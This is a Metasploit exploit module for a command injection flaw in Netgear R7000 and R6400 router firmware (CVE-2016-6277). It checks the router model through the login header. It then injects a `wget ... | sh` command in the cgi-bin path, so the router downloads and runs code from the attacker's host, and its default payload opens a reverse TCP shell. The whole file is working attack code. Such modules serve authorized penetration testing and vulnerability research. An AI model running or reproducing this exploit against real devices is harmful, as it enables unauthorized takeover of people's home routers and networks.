# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;                 => "Netgear R7000 and R6400 cgi-bin Command Injection",
      &#039;Description&#039;          => %q{
        This module exploits an arbitrary command injection vulnerability in
        Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.
      },
      &#039;License&#039;              => MSF_LICENSE,
      &#039;Platform&#039;             => &#039;linux&#039;,
      &#039;Author&#039;               => [&#039;thecarterb&#039;, &#039;Acew0rm&#039;],
      &#039;DefaultTarget&#039;        => 0,
      &#039;Privileged&#039;           => true,
      &#039;Arch&#039;                 => ARCH_ARMLE,
      &#039;Targets&#039;              => [
        [ &#039;Automatic Target&#039;, { } ]
      ],
      &#039;References&#039;           =>
        [
          [ &#039;EDB&#039;, &#039;40889&#039;],
          [ &#039;URL&#039;, &#039;http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305&#039;],
          [ &#039;URL&#039;, &#039;https://www.kb.cert.org/vuls/id/582384&#039;],
          [ &#039;URL&#039;, &#039;http://kb.netgear.com/000036386/CVE-2016-582384&#039;],
          [ &#039;CVE&#039;, &#039;2016-6277&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Dec 06 2016&#039;,
      &#039;DefaultOptions&#039;  =>
        {
          &#039;PAYLOAD&#039; => &#039;linux/armle/mettle_reverse_tcp&#039;
        }
    ))

    register_options(
      [
        Opt::RPORT(80)
      ], self.class)

    deregister_options(&#039;URIPATH&#039;)
  end

  def scrape(text, start_trig, end_trig)
    text[/#{start_trig}(.*?)#{end_trig}/m, 1]
  end

  # Requests the login page which discloses the hardware, if it&#039;s an R7000 or R6400, return Detected
  def check
    res = send_request_cgi({&#039;uri&#039;=>&#039;/&#039;})
    if res.nil?
      fail_with(Failure::Unreachable, &#039;Connection timed out.&#039;)
    end
     # Checks for the `WWW-Authenticate` header in the response
    if res.headers["WWW-Authenticate"]
      data = res.to_s
      marker_one = "Basic realm=\"NETGEAR "
      marker_two = "\""
      model = scrape(data, marker_one, marker_two)
      vprint_status("Router is a NETGEAR router (#{model})")
      if model == &#039;R7000&#039; || model == &#039;R6400&#039;
        print_good("Router may be vulnerable (NETGEAR #{model})")
        return CheckCode::Detected
      else
        return CheckCode::Safe
      end
    else
      print_error(&#039;Router is not a NETGEAR router&#039;)
      return CheckCode::Safe
    end
  end

  def exploit
    return if check == CheckCode::Safe

    @cmdstager = generate_cmdstager(flavor: :wget, &#039;Path&#039; => &#039;/&#039;).join(&#039;;&#039;)

    send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => "/cgi-bin/;wget$IFS-O-$IFS&#039;#{srvhost_addr}:#{srvport}&#039;|sh"
    )
  end

  # Return CmdStager on first request, payload on second
  def on_request_uri(cli, request)
    if @cmdstager
      send_response(cli, @cmdstager)
      @cmdstager = nil
    else
      super
    end
  end

end

